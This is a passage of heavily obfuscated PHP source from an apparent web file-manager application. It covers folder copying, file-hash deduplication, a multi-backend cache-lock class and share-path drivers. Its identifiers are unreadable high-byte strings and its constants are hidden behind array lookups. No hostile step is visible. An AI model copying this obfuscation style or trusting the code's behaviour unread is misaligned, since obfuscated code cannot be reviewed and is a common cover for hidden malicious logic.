$Ê°ÉÍâô; } private function _copyChildTo($ßä—Ş—“, $æ»©‚ü, $Ãáà©Å¼, $Î´ÙÖ°©, &$ø†ÑÆâ˜, $å°¾ö¯¡, $Ÿº¤‡®ß) { $À§È‰ï =& $_SERVER[ŒÅŸ‹ä†]; $ïŸ—ê © = $this->sourceInfoCache($Ãáà©Å¼); $´ßî¤Â³ = $ßä—Ş—“->listPath($æ»©‚ü); $´ßî¤Â³ = $´ßî¤Â³ ? $´ßî¤Â³ : array($À§È‰ï[96] => array(), $À§È‰ï[95] => array()); $üå—áğÅ = array_merge($´ßî¤Â³[$À§È‰ï[96]], $´ßî¤Â³[$À§È‰ï[95]]); $ŒºÔóõô = $this->_addFiles($ßä—Ş—“, $Ÿº¤‡®ß, $´ßî¤Â³[$À§È‰ï[96]], $å°¾ö¯¡); $‰ØõÊ‰À = array(); foreach ($üå—áğÅ as &$»ıèºò) { if (isset($ŒºÔóõô[$»ıèºò[$À§È‰ï[42]]])) { $»ıèºò = $ŒºÔóõô[$»ıèºò[$À§È‰ï[42]]]; } $»ıèºò[$À§È‰ï[505]] = $»ıèºò[$À§È‰ï[43]] == $À§È‰ï[88]; $»ıèºò[$À§È‰ï[506]] = substr(_get($»ıèºò, $À§È‰ï[177], $À§È‰ï[12]), 0, 10); $»ıèºò[$À§È‰ï[89]] = _get($»ıèºò, $À§È‰ï[89], 0); $»ıèºò[$À§È‰ï[562]] = _get($»ıèºò, $À§È‰ï[562], 0); if (!isset($»ıèºò[$À§È‰ï[698]]) && $»ıèºò[$À§È‰ï[562]]) { $ø†ÑÆâ˜[$À§È‰ï[695]][] = $»ıèºò[$À§È‰ï[562]]; } if ($Î´ÙÖ°©) { $üÃ‚ï© = $this->fileNameExistCache($Ãáà©Å¼, $»ıèºò[$À§È‰ï[42]]); if ($üÃ‚ï©) { if ($»ıèºò[$À§È‰ï[505]] || $Î´ÙÖ°© == REPEAT_SKIP) { continue; } if ($Î´ÙÖ°© == REPEAT_REPLACE) { $éş÷Ì†“ = $this->sourceInfoCache($üÃ‚ï©); $ßÌ§å¢­ = $this->fileHistory($éş÷Ì†“, $»ıèºò[$À§È‰ï[562]], $»ıèºò[$À§È‰ï[89]]); if ($ßÌ§å¢­) { $ø†ÑÆâ˜[$À§È‰ï[657]][] = $»ıèºò[$À§È‰ï[562]]; } continue; } else { if ($Î´ÙÖ°© == REPEAT_RENAME) { $»ıèºò[$À§È‰ï[42]] = $this->fileNameAutoCache($Ãáà©Å¼, $»ıèºò[$À§È‰ï[42]], $Î´ÙÖ°©, !1); } } } } if (!$»ıèºò[$À§È‰ï[505]] && $»ıèºò[$À§È‰ï[562]] == 0) { continue; } if (!$»ıèºò[$À§È‰ï[505]] && $»ıèºò[$À§È‰ï[562]]) { $ø†ÑÆâ˜[$À§È‰ï[657]][] = $»ıèºò[$À§È‰ï[562]]; } $‰ØõÊ‰À[] = $this->_makeItemData($»ıèºò, $ïŸ—ê ©, $»ıèºò[$À§È‰ï[42]]); } unset($»ıèºò); if (!empty($‰ØõÊ‰À)) { $this->addAll($‰ØõÊ‰À); $this->_childrenListSelect($Ãáà©Å¼); } $ŸŒêÕÊó = $this->_childrenList($Ãáà©Å¼); $ŸŒêÕÊó = array_to_keyvalue($ŸŒêÕÊó, $À§È‰ï[42]); foreach ($üå—áğÅ as $»ıèºò) { $éş÷Ì†“ = $ŸŒêÕÊó[$»ıèºò[$À§È‰ï[42]]]; $û³ˆÙó = $éş÷Ì†“[$À§È‰ï[202]]; $this->_copyApplyMeta($éş÷Ì†“, $ø†ÑÆâ˜); if ($»ıèºò[$À§È‰ï[43]] == $À§È‰ï[88]) { $»ıèºò[$À§È‰ï[97]] = $ßä—Ş—“->getPathInner($»ıèºò[$À§È‰ï[97]]); $this->_copyChildTo($ßä—Ş—“, $»ıèºò[$À§È‰ï[97]], $û³ˆÙó, $Î´ÙÖ°©, $ø†ÑÆâ˜, $å°¾ö¯¡, $Ÿº¤‡®ß); } } } private function _addFiles($À¤åé°Â, $¿ğŠëãœ, $º´ã© , $–é­€ú) { $üû¹Ğù =& $_SERVER[ŒÅŸ‹ä†]; if (!$º´ã©  || count($º´ã© ) == 0) { return array(); } $¤‹¸í‡¯ = array(); foreach ($º´ã©  as &$îæúó„œ) { Hook::trigger($üû¹Ğù[699], $îæúó„œ); $îæúó„œ[$üû¹Ğù[97]] = $À¤åé°Â->getPathInner($îæúó„œ[$üû¹Ğù[97]]); $·Šï¬ñË = $À¤åé°Â->hashSimple($îæúó„œ[$üû¹Ğù[97]]); $ÔÕúÍÂ² = $À¤åé°Â->hashMd5($îæúó„œ[$üû¹Ğù[97]]); if (strlen($ÔÕúÍÂ²) > 10 && !isset($¤‹¸í‡¯[$ÔÕúÍÂ²])) { $¤‹¸í‡¯[$ÔÕúÍÂ²] = array(); } $îæúó„œ[$üû¹Ğù[700]] = $·Šï¬ñË; $îæúó„œ[$üû¹Ğù[568]] = $ÔÕúÍÂ²; $¤‹¸í‡¯[$ÔÕúÍÂ²][] =& $îæúó„œ; if (count($¤‹¸í‡¯[$ÔÕúÍÂ²]) > 1) { $îæúó„œ[$üû¹Ğù[698]] = !0; } Hook::trigger($üû¹Ğù[701], $îæúó„œ); } unset($îæúó„œ); $¶©Ğıíä = array($üû¹Ğù[568] => array($üû¹Ğù[7], array_keys($¤‹¸í‡¯))); $ÃÇ§’Û = Model($üû¹Ğù[702]); $ûÄ ¤Ç… = $ÃÇ§’Û->where($¶©Ğıíä)->select(); $ûÄ ¤Ç… = $ûÄ ¤Ç… ? $ûÄ ¤Ç… : array(); foreach ($ûÄ ¤Ç… as $”‘„˜Š) { if (!isset($¤‹¸í‡¯[$”‘„˜Š[$üû¹Ğù[568]]])) { continue; } $ÇóØ­ší = $¤‹¸í‡¯[$”‘„˜Š[$üû¹Ğù[568]]]; foreach ($ÇóØ­ší as &$îæúó„œ) { $îæúó„œ[$üû¹Ğù[562]] = $”‘„˜Š[$üû¹Ğù[562]]; $îæúó„œ[$üû¹Ğù[698]] = !0; } unset($îæúó„œ); } $•¯Ğáô = array(); foreach ($º´ã©  as $±äóï‘) { Hook::trigger($üû¹Ğù[703], $±äóï‘); if (isset($±äóï‘[$üû¹Ğù[698]]) && $±äóï‘[$üû¹Ğù[698]]) { Hook::trigger($üû¹Ğù[704], $±äóï‘); continue; } $ëàÃ¼ = $À¤åé°Â->getPathInner($±äóï‘[$üû¹Ğù[97]]); $Ÿèºè» = $ÃÇ§’Û->addFileMake($ëàÃ¼, $¿ğŠëãœ, $±äóï‘[$üû¹Ğù[89]], $±äóï‘[$üû¹Ğù[700]], $±äóï‘[$üû¹Ğù[568]], $±äóï‘[$üû¹Ğù[42]], $–é­€ú); Hook::trigger($üû¹Ğù[704], $±äóï‘); if (!is_array($Ÿèºè»)) { continue; } $•¯Ğáô[] = $Ÿèºè»; } $ÃÇ§’Û->addAll($•¯Ğáô); $¶©Ğıíä = array($üû¹Ğù[568] => array($üû¹Ğù[7], array_keys($¤‹¸í‡¯))); $ûÄ ¤Ç… = $ÃÇ§’Û->where($¶©Ğıíä)->select(); $ûÄ ¤Ç… = $ûÄ ¤Ç… ? $ûÄ ¤Ç… : array(); foreach ($ûÄ ¤Ç… as $”‘„˜Š) { if (!isset($¤‹¸í‡¯[$”‘„˜Š[$üû¹Ğù[568]]])) { continue; } $ıñ«Ğ•³ =& $¤‹¸í‡¯[$”‘„˜Š[$üû¹Ğù[568]]]; foreach ($ıñ«Ğ•³ as &$îæúó„œ) { $îæúó„œ[$üû¹Ğù[562]] = $”‘„˜Š[$üû¹Ğù[562]]; } unset($îæúó„œ); } $Çô„°şÔ = array(); foreach ($º´ã©  as $ÃÇ‹Ï’Œ) { $Çô„°şÔ[$ÃÇ‹Ï’Œ[$üû¹Ğù[42]]] = $ÃÇ‹Ï’Œ; } return $Çô„°şÔ; } } define($_SERVER[ŒÅŸ‹ä†][705], $_SERVER[ŒÅŸ‹ä†][706]); goto cºÍ‹Ò™µä; Cäİóí‚„Ù: class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $ë™ôÀ£ù =& $_SERVER[ŒÅŸ‹ä†]; if (self::$handle) { return self::$handle; } $Ô¾©ÓÔ¦ = $GLOBALS[$ë™ôÀ£ù[6]][$ë™ôÀ£ù[434]]; self::$timeout = $Ô¾©ÓÔ¦[$ë™ôÀ£ù[948]] ? $Ô¾©ÓÔ¦[$ë™ôÀ£ù[948]] : 10; $øæ“€â¸ = _get($GLOBALS[$ë™ôÀ£ù[6]], $ë™ôÀ£ù[949]); $£¹Íæ¤Š = $Ô¾©ÓÔ¦[$ë™ôÀ£ù[931]] ? $Ô¾©ÓÔ¦[$ë™ôÀ£ù[931]] : $ë™ôÀ£ù[241]; if ($£¹Íæ¤Š == $ë™ôÀ£ù[31] && $øæ“€â¸ == $ë™ôÀ£ù[23]) { $£¹Íæ¤Š = $ë™ôÀ£ù[241]; } switch ($£¹Íæ¤Š) { case $ë™ôÀ£ù[934]: self::$handle = new CacheLockRedis(); break; case $ë™ôÀ£ù[935]: self::$handle = new CacheLockMemcached(); break; case $ë™ôÀ£ù[31]: self::$handle = new CacheLockDatabase(); break; case $ë™ôÀ£ù[241]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($ë™ôÀ£ù[950], $ë™ôÀ£ù[951]); } return self::$handle; } private static function key($–Õ‹³¾ê) { return $_SERVER[ŒÅŸ‹ä†][952] . Cache::key($–Õ‹³¾ê); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($ñ»Â ‚Š = '') { self::$errorMsg = $ñ»Â ‚Š; } public static function lockGlobal($å¾Şˆœ, $®¹ ìªù) { return self::lock($å¾Şˆœ, $®¹ ìªù, !0); } public static function lock($ü©´ÑŒª, $Ê¶Û½ÎØ = false, $—ĞèŠ = false) { $­êé•Ì± =& $_SERVER[ŒÅŸ‹ä†]; $í¨÷ëÒ» = self::init(); $óŸÅäò— = self::key($ü©´ÑŒª); $Ê¶Û½ÎØ = $Ê¶Û½ÎØ ? $Ê¶Û½ÎØ : self::$timeout; $òŠ€‘íô = timeFloat(); if (_get($GLOBALS, $­êé•Ì±[953], !1)) { if (!$í¨÷ëÒ»->lock($óŸÅäò—, 0.2)) { die; } return !0; } $×ï¬áæ¾ = $í¨÷ëÒ»->lock($óŸÅäò—, $Ê¶Û½ÎØ); $ùªŠğ£€ = timeFloat(); if (!$×ï¬áæ¾) { $û×¢Êƒ = "\x6c\x6f\143\x6b\x20\145\x72\x72\x6f\x72\x3b\153\145\x79\x3d{$ü©´ÑŒª}\73\164\151\x6d\145\x3d{$Ê¶Û½ÎØ}\x3b" . self::$errorMsg . $­êé•Ì±[84] . get_caller_msg(); $Ú¥ìó”ò = LNG($­êé•Ì±[954]) . "\50{$Ê¶Û½ÎØ}\x73\x29\x2e" . LNG($­êé•Ì±[955]); $Ú¥ìó”ò .= $­êé•Ì±[956]; if (is_string(self::$errorMsg) && self::$errorMsg) { $Ú¥ìó”ò = $Ú¥ìó”ò . $­êé•Ì±[957] . self::$errorMsg; } write_log($­êé•Ì±[958] . sprintf($­êé•Ì±[959], timeFloat() - $òŠ€‘íô) . $­êé•Ì±[960] . $û×¢Êƒ . $­êé•Ì±[961] . json_encode(error_get_last()), $­êé•Ì±[951]); show_json($Ú¥ìó”ò, !1); } if (!$—ĞèŠ) { self::$lockItem[$óŸÅäò—] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $“ôÎÂñ• = number_format(timeFloat() - $ùªŠğ£€, 3); write_log($­êé•Ì±[962] . $ü©´ÑŒª . $­êé•Ì±[963] . $“ôÎÂñ•, $­êé•Ì±[951]); } return $×ï¬áæ¾; } public static function lockGet($Á¿‡Ú«ô) { $¯Õõò‡… = self::key($Á¿‡Ú«ô); if (self::$lockItem[$¯Õõò‡…]) { return self::$lockItem[$¯Õõò‡…]; } return self::init()->lockGet($¯Õõò‡…); } public static function unlock($ëœß½ã‰) { $éÈªôÃÆ =& $_SERVER[ŒÅŸ‹ä†]; $º¸§è‹ = self::key($ëœß½ã‰); self::$lockItem[$º¸§è‹] = null; self::init()->unlock($º¸§è‹); if (GLOBAL_DEBUG_LOG_ALL) { write_log($éÈªôÃÆ[964] . $ëœß½ã‰, $éÈªôÃÆ[951]); } return; } public static function unlockRuntime() { $ƒª¦¹¯ğ =& $_SERVER[ŒÅŸ‹ä†]; $²ãÁÛ£ = self::init(); $œÅøÛ = !1; foreach (self::$lockItem as $¤Æ¹Â§õ => $ŒğºÍ”) { if (!$ŒğºÍ”) { continue; } $²ãÁÛ£->unlock($¤Æ¹Â§õ); if (!$œÅøÛ) { $œÅøÛ = !0; write_log($ƒª¦¹¯ğ[965] . $¤Æ¹Â§õ . $ƒª¦¹¯ğ[84] . get_caller_msg(), $ƒª¦¹¯ğ[951]); continue; } write_log($ƒª¦¹¯ğ[965] . $¤Æ¹Â§õ, $ƒª¦¹¯ğ[951]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $Ä‰ü¸Ë– = number_format(timeFloat() - TIME_FLOAT, 3); write_log($ƒª¦¹¯ğ[966] . $Ä‰ü¸Ë– . $ƒª¦¹¯ğ[967] . ACTION, $ƒª¦¹¯ğ[951]); } } public static function fileLock($ú¶İë·Í) { $°Ì€õÈæ =& $_SERVER[ŒÅŸ‹ä†]; if (!$GLOBALS[$°Ì€õÈæ[968]]) { $GLOBALS[$°Ì€õÈæ[968]] = array(); } $GLOBALS[$°Ì€õÈæ[968]][$ú¶İë·Í] = !1; $“¨­÷Õá = fopen(DATA_PATH . $ú¶İë·Í . $°Ì€õÈæ[969], $°Ì€õÈæ[970]); if (!$“¨­÷Õá) { return !1; } $GLOBALS[$°Ì€õÈæ[968]][$ú¶İë·Í] = $“¨­÷Õá; if (flock($“¨­÷Õá, LOCK_EX)) { return !0; } self::unlock($ú¶İë·Í); show_json($°Ì€õÈæ[971], !1); return !1; } public static function fileUnlock($©º†Ô´§) { $¬šğíºı =& $_SERVER[ŒÅŸ‹ä†]; $±“ûÑ›Ä = $GLOBALS[$¬šğíºı[968]][$©º†Ô´§]; if (!$±“ûÑ›Ä) { return; } $GLOBALS[$¬šğíºı[968]][$©º†Ô´§] = !1; flock($±“ûÑ›Ä, LOCK_UN); fclose($±“ûÑ›Ä); } public static function fileUnlockAll() { $òñÑü˜¹ =& $_SERVER[ŒÅŸ‹ä†]; if (!isset($GLOBALS[$òñÑü˜¹[968]]) || !$GLOBALS[$òñÑü˜¹[968]]) { return; } foreach ($GLOBALS[$òñÑü˜¹[968]] as $È¤è…ª => $¸¿Ç) { if (!$¸¿Ç) { continue; } $GLOBALS[$òñÑü˜¹[968]][$È¤è…ª] = !1; flock($¸¿Ç, LOCK_UN); fclose($¸¿Ç); } $GLOBALS[$òñÑü˜¹[968]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $°Â«¸ö =& $_SERVER[ŒÅŸ‹ä†]; $ ªíÍÌŸ = $GLOBALS[$°Â«¸ö[6]][$°Â«¸ö[434]]; self::$cachePath = $ ªíÍÌŸ[$°Â«¸ö[241]][$°Â«¸ö[97]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($ßïåëš, $†ü¦´š÷ = 0) { $¿ƒµÑ‹Ì =& $_SERVER[ŒÅŸ‹ä†]; $Ûèëô· = microtime(!0); $£Ã¦Û¦‚ = $Ûèëô· + $†ü¦´š÷ + 0.0001; $œ›”¤úµ = rtrim(self::$cachePath, $¿ƒµÑ‹Ì[8]) . $¿ƒµÑ‹Ì[972] . md5($ßïåëš) . $¿ƒµÑ‹Ì[969]; if (file_exists($œ›”¤úµ) && filemtime($œ›”¤úµ) && filemtime($œ›”¤úµ) < time() - 10) { @unlink($œ›”¤úµ); } do { if (file_exists($œ›”¤úµ)) { cacheLockWait(); continue; } $¢ÀºŠÉÆ = fopen($œ›”¤úµ, $¿ƒµÑ‹Ì[973]); if (!$¢ÀºŠÉÆ) { return !1; } $Òªõ°Çï = flock($¢ÀºŠÉÆ, LOCK_EX | LOCK_NB); self::$caches[$ßïåëš] = array($¿ƒµÑ‹Ì[974] => $¢ÀºŠÉÆ, $¿ƒµÑ‹Ì[241] => $œ›”¤úµ); fwrite($¢ÀºŠÉÆ, $£Ã¦Û¦‚); clearstatcache(); if ($¢ÀºŠÉÆ && $Òªõ°Çï) { return !0; } cacheLockWait(); } while (microtime(!0) < $£Ã¦Û¦‚); $this->unlock($ßïåëš); return !1; } public function lockGet($õ¶†²£¢) { $îà¸»Øã =& $_SERVER[ŒÅŸ‹ä†]; $Áà–Ä›° = rtrim(self::$cachePath, $îà¸»Øã[8]) . $îà¸»Øã[972] . md5($õ¶†²£¢) . $îà¸»Øã[969]; return file_exists($Áà–Ä›°); } public function unlock($şÑÔãû³) { $ş±æÉ›„ =& $_SERVER[ŒÅŸ‹ä†]; $¢·ÔïíË = self::$caches[$şÑÔãû³]; if (!$¢·ÔïíË) { return; } @flock($¢·ÔïíË[$ş±æÉ›„[974]], LOCK_UN); @fclose($¢·ÔïíË[$ş±æÉ›„[974]]); @unlink($¢·ÔïíË[$ş±æÉ›„[241]]); unset(self::$caches[$şÑÔãû³]); } } goto dìµ×Õç¬‚; a„Ø¦Èßö: class PathDriverDbShareItem extends PathDriverDB { public function __construct($Ö¤Ñ¾ŠĞ) { $this->pathParse = $Ö¤Ñ¾ŠĞ; $this->model = Model($_SERVER[ŒÅŸ‹ä†][1477]); } public function getPathRoot() { $ß†Æ’ìæ =& $_SERVER[ŒÅŸ‹ä†]; return KodIO::makeShare($this->pathParse[$ß†Æ’ìæ[492]], $this->pathParse[$ß†Æ’ìæ[1301]]); } public function getPathOuter($ÛÇÅŒ¨Ù) { $…š‚ñ‡À =& $_SERVER[ŒÅŸ‹ä†]; if (!$ÛÇÅŒ¨Ù) { return $ÛÇÅŒ¨Ù; } $ï €§º¹ = $this->parse($ÛÇÅŒ¨Ù); return trim(KodIO::makeShare($this->pathParse[$…š‚ñ‡À[492]], $ï €§º¹[$…š‚ñ‡À[492]]), $…š‚ñ‡À[8]); } public function isParentOf($­şŞ»²Ö, $ãâ…·±) { $ÍÍ•Ñæ¤ = IO::init($ãâ…·±); return $this->model->isParentOf($­şŞ»²Ö, $ÍÍ•Ñæ¤->path); } protected function infoParse($ÖŞÏıÉ€, $ùª·´İï = false, $ØãçÈÛŠ = false) { $®¿«áàû =& $_SERVER[ŒÅŸ‹ä†]; static $¬Ä¬É‹ù = array(); $øÁú÷˜Ó = $this->pathParse[$®¿«áàû[492]]; $ÅÔÅ¢ = trim($this->pathParse[$®¿«áàû[1297]], $®¿«áàû[8]); if (isset($¬Ä¬É‹ù[$ÅÔÅ¢]) && is_array($¬Ä¬É‹ù[$ÅÔÅ¢])) { return $¬Ä¬É‹ù[$ÅÔÅ¢]; } $Ç©Šã² = Action($®¿«áàû[1484])->sharePathInfo($øÁú÷˜Ó, $ÅÔÅ¢, $ùª·´İï); $¬Ä¬É‹ù[$ÅÔÅ¢] = $Ç©Šã²; return $Ç©Šã²; } public function infoFull($ÃãçÒª‡) { $—‡­ÕÙ =& $_SERVER[ŒÅŸ‹ä†]; $®¿›ú¢Å = explode($—‡­ÕÙ[8], trim($ÃãçÒª‡, $—‡­ÕÙ[8])); if (count($®¿›ú¢Å) > 1) { $¯÷æÜÀ± = implode($—‡­ÕÙ[8], array_splice($®¿›ú¢Å, 1)); $›ë¨²Ëı = $this->model->pathInfoByPath($®¿›ú¢Å[0], $¯÷æÜÀ±); if (!$›ë¨²Ëı) { return !1; } $this->pathParse[$—‡­ÕÙ[1297]] = $›ë¨²Ëı[$—‡­ÕÙ[202]]; } return $this->infoParse($ÃãçÒª‡); } public function listAll($†É„·) { $Ä¾í×õÜ =& $_SERVER[ŒÅŸ‹ä†]; $Î«–®¾Â = IO::info($this->pathParse[$Ä¾í×õÜ[97]]); if (!$Î«–®¾Â) { return array(); } $Ì¨‹Æ®ë = $this->model->listAll($†É„·); $îĞ®ı‚® = Model($Ä¾í×õÜ[692])->getInfo($Î«–®¾Â[$Ä¾í×õÜ[693]]); foreach ($Ì¨‹Æ®ë as &$‘€ØÒñ) { check_abort(); $‘€ØÒñ[$Ä¾í×õÜ[100]] = Action($Ä¾í×õÜ[1484])->_shareItemeParse($‘€ØÒñ[$Ä¾í×õÜ[100]], $îĞ®ı‚®); } unset($‘€ØÒñ); return $Ì¨‹Æ®ë; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($Í¸º÷ÖÔ) { $this->pathParse = $Í¸º÷ÖÔ; $this->model = Model($_SERVER[ŒÅŸ‹ä†][1477]); } protected function infoParse($í¨ı‘ç, $¨²Ö¾Ÿü = false, $éá¯Ë° = false) { $ÛºÕ¡õæ =& $_SERVER[ŒÅŸ‹ä†]; return Action($ÛºÕ¡õæ[1304])->sharePathInfo($this->pathParse[$ÛºÕ¡õæ[97]], !0, $¨²Ö¾Ÿü); } public function listPath($â›®•½¯, $…ÖûåÁµ = false) { $…İéÎ™¬ =& $_SERVER[ŒÅŸ‹ä†]; $·§òÖà£ = parent::listPath($â›®•½¯, $…ÖûåÁµ); if (!$·§òÖà£) { return $·§òÖà£; } if (is_array($·§òÖà£[$…İéÎ™¬[1485]])) { $·§òÖà£[$…İéÎ™¬[1485]] = Action($…İéÎ™¬[1304])->shareItemInfo($·§òÖà£[$…İéÎ™¬[1485]]); } foreach ($·§òÖà£ as $®”¼¯ÉÑ => $€ŒÚĞ„€) { if (!in_array($®”¼¯ÉÑ, array($…İéÎ™¬[96], $…İéÎ™¬[95]))) { continue; } foreach ($€ŒÚĞ„€ as $©£Ó¢£§ => $¹ Ô•Ã’) { $·§òÖà£[$®”¼¯ÉÑ][$©£Ó¢£§] = Action($…İéÎ™¬[1304])->shareItemInfo($¹ Ô•Ã’); } } return $·§òÖà£; } public function listAll($Ö¶ğÄÉ°) { $’Ğàû± =& $_SERVER[ŒÅŸ‹ä†]; $˜õ•íå = IO::info($this->pathParse[$’Ğàû±[97]]); if (!$˜õ•íå) { return array(); } $·úü ©Ö = $this->model->listAll($Ö¶ğÄÉ°); foreach ($·úü ©Ö as &$ü‡ğâõ½) { $ü‡ğâõ½[$’Ğàû±[100]] = Action($’Ğàû±[1304])->shareItemInfo($ü‡ğâõ½[$’Ğàû±[100]]); } unset($ü‡ğâõ½); return $·úü ©Ö; } } class PathDriverDriverShareItem { public function __construct($ïÙØÉ¶€) { $this->pathParse = $ïÙØÉ¶€; } public function __call($‡°ì†˜Õ, $İÛÁÄ†î) { $¼“¯·ÉÄ =& $_SERVER[ŒÅŸ‹ä†]; if (method_exists($this, $‡°ì†˜Õ)) { return; } $³ËàÊ€„ = call_user_func_array(array($¼“¯·ÉÄ[1486], $‡°ì†˜Õ), $İÛÁÄ†î); $é¨ÜŞšÏ = array($¼“¯·ÉÄ[1487], $¼“¯·ÉÄ[1488], $¼“¯·ÉÄ[1489], $¼“¯·ÉÄ[1490], $¼“¯·ÉÄ[646], $¼“¯·ÉÄ[648], $¼“¯·ÉÄ[1491], $¼“¯·ÉÄ[118], $¼“¯·ÉÄ[1492], $¼“¯·ÉÄ[1493]); if (in_array($‡°ì†˜Õ, $é¨ÜŞšÏ)) { $³ËàÊ€„ = $this->getPathOuter($³ËàÊ€„); } return $³ËàÊ€„; } public function copy($Œ³²À÷Œ, $â¤Â±ØÉ, $ØÑó®¸ = false, $”ŞšÑœ© = false) { return $this->copyMove($Œ³²À÷Œ, $â¤Â±ØÉ, $ØÑó®¸, $_SERVER[ŒÅŸ‹ä†][646], $”ŞšÑœ©); } public function move($èÛóåúé, $©©„³à›, $÷»÷âàî = false, $Ã¬§×ã¥ = false) { return $this->copyMove($èÛóåúé, $©©„³à›, $÷»÷âàî, $_SERVER[ŒÅŸ‹ä†][648], $Ã¬§×ã¥); } private function copyMove($òÑµò–, $Ñ×Í¤ë, $µş¡ä·, $İ¤Î€ê, $ÙßåºÊÈ = false) { $÷Ôû½ìï =& $_SERVER[ŒÅŸ‹ä†]; $Êö¹™ = $Ñ×Í¤ë; $üüµöÃ¥ = IO::driverMake($Ñ×Í¤ë); if ($üüµöÃ¥->pathParse[$÷Ôû½ìï[1278]]) { $Ñ×Í¤ë = $üüµöÃ¥->pathParse[$÷Ôû½ìï[1278]]; } else { $Ñ×Í¤ë = $Êö¹™; } $¾½Áû²² = IO::copyMove($òÑµò–, $Ñ×Í¤ë, $µş¡ä·, $İ¤Î€ê, $ÙßåºÊÈ); $¾½Áû²² = $this->getPathOuter($¾½Áû²²); return $¾½Áû²²; } public function pathThis($¾ÍÃÔÌ½) { return get_path_this($this->pathParse[$_SERVER[ŒÅŸ‹ä†][97]]); } public function pathFather($ı•ß£‘) { return get_path_father($this->pathParse[$_SERVER[ŒÅŸ‹ä†][97]]); } public function iconvSystem($ù£×§í°) { return $ù£×§í°; } protected function infoParse($Œ¨Ğö½Ğ, $ªıñáÃ‹ = false) { $…ŠÔù’ =& $_SERVER[ŒÅŸ‹ä†]; $ÇÄ×¿»Ó = $this->pathParse[$…ŠÔù’[581]][$…ŠÔù’[588]] . $this->pathParse[$…ŠÔù’[1297]]; if ($ªıñáÃ‹) { $ğ˜¡¡Ïì = IO::infoWithChildren($ÇÄ×¿»Ó); } else { $ğ˜¡¡Ïì = IO::info($ÇÄ×¿»Ó); } $œÇ¼ùÛÏ = $this->pathParse[$…ŠÔù’[581]]; return Action($…ŠÔù’[1484])->_shareItemeParse($ğ˜¡¡Ïì, $œÇ¼ùÛÏ); } public function listAll($‡ÉÌû) { $òÅéş§ =& $_SERVER[ŒÅŸ‹ä†]; $åò¯™ŸÎ = IO::listAll($‡ÉÌû); $ò¾á»ƒñ = rtrim($this->pathParse[$òÅéş§[581]][$òÅéş§[588]], $òÅéş§[8]); foreach ($åò¯™ŸÎ as &$ÒÎ€£»î) { $ÒÎ€£»î[$òÅéş§[97]] = $this->pathDriver . $òÅéş§[8] . ltrim(substr($ÒÎ€£»î[$òÅéş§[97]], strlen($ò¾á»ƒñ)), $òÅéş§[8]); } unset($ÒÎ€£»î); return $åò¯™ŸÎ; } public function listAllSimple($Óèòê«ú, $‘ˆ¸ûğÉ = false) { $ı¡œÒÚ¬ =& $_SERVER[ŒÅŸ‹ä†]; $óÜÂ–­û = $this->listAll($Óèòê«ú); $ĞßËœÌ = $this->pathParse[$ı¡œÒÚ¬[515]]; if (trim($ĞßËœÌ, $ı¡œÒÚ¬[8]) == trim(get_path_father($ĞßËœÌ), $ı¡œÒÚ¬[8])) { $‘ˆ¸ûğÉ = !0; } return IO::init($ı¡œÒÚ¬[12])->listAllSimpleMake($óÜÂ–­û, $ĞßËœÌ, $‘ˆ¸ûğÉ); } public function getPathOuter($—µâß²¢) { $š¹ƒÙ˜¨ =& $_SERVER[ŒÅŸ‹ä†]; $…èèğ“İ = KodIO::parse($—µâß²¢); if ($…èèğ“İ[$š¹ƒÙ˜¨[43]] == KodIO::KOD_SHARE_ITEM) { return $…èèğ“İ[$š¹ƒÙ˜¨[97]]; } $ÎéğœÉ¦ = KodIO::clear($—µâß²¢); $«ìÛöé— = KodIO::clear($this->pathParse[$š¹ƒÙ˜¨[581]][$š¹ƒÙ˜¨[588]]); $—ˆ–ï½… = substr($ÎéğœÉ¦, strlen($«ìÛöé—)); if (substr($ÎéğœÉ¦, 0, strlen($«ìÛöé—)) != $«ìÛöé—) { return !1; } return $this->pathParse[$š¹ƒÙ˜¨[1298]] . $š¹ƒÙ˜¨[8] . ltrim($—ˆ–ï½…, $š¹ƒÙ˜¨[8]); } public function getType() { $¸’òœø– =& $_SERVER[ŒÅŸ‹ä†]; $¸Øâäœù = str_replace($¸’òœø–[87], $¸’òœø–[12], get_class($this)); return strtolower($¸Øâäœù); } public function isOsDriver($¬ •ğ®) { return IO::isOsDriver($¬ •ğ®); } public function info($¹‰Œ¦¨í) { return $this->infoParse($¹‰Œ¦¨í); } public function infoAuth($ÉøÃÇùô) { return $this->infoParse($ÉøÃÇùô); } public function infoWithChildren($ı¬–Ü¶ç) { return $this->infoParse($ı¬–Ü¶ç, !0); } public function infoFull($¶™ÈÅ£æ) { return $this->infoParse($¶™ÈÅ£æ); } } goto FÈÖõÔ¼ÆÌ; fìÔÎ…ñĞ: class CacheLockDatabase { public function lock($ÊÒ¹Şä§, $ñÉ…Ïšù = 0) { $¢¡·Áì² = Model($_SERVER[ŒÅŸ‹ä†][933]); $œÔØŞ±Û = microtime(!0) + $ñÉ…Ïšù; while (microtime(!0) < $œÔØŞ±Û) { $‡ëü—«× = $¢¡·Áì²->get($ÊÒ¹Şä§); if (!$‡ëü—«× || $‡ëü—«× < microtime(!0)) { $áÖéÇñª = $¢¡·Áì²->set($ÊÒ¹Şä§, $œÔØŞ±Û); if ($áÖéÇñª) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($­Öõşß) { return Model($_SERVER[ŒÅŸ‹ä†][933])->get($­Öõşß); } public function unlock($ì“–úí) { Model($_SERVER[ŒÅŸ‹ä†][933])->remove($ì“–úí); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($¼ßŸ‹²è, $™¤œôÔ¨) { $µÉİù“Æ =& $_SERVER[ŒÅŸ‹ä†]; if (!class_exists($µÉİù“Æ[975])) { show_json($µÉİù“Æ[976], !1); } $this->cacheTime = $™¤œôÔ¨; $this->handle = new Memcached(); if (is_array($¼ßŸ‹²è[$µÉİù“Æ[977]]) && count($¼ßŸ‹²è[$µÉİù“Æ[977]]) >= 1) { foreach ($¼ßŸ‹²è[$µÉİù“Æ[977]] as $ÖÙ½—”·) { 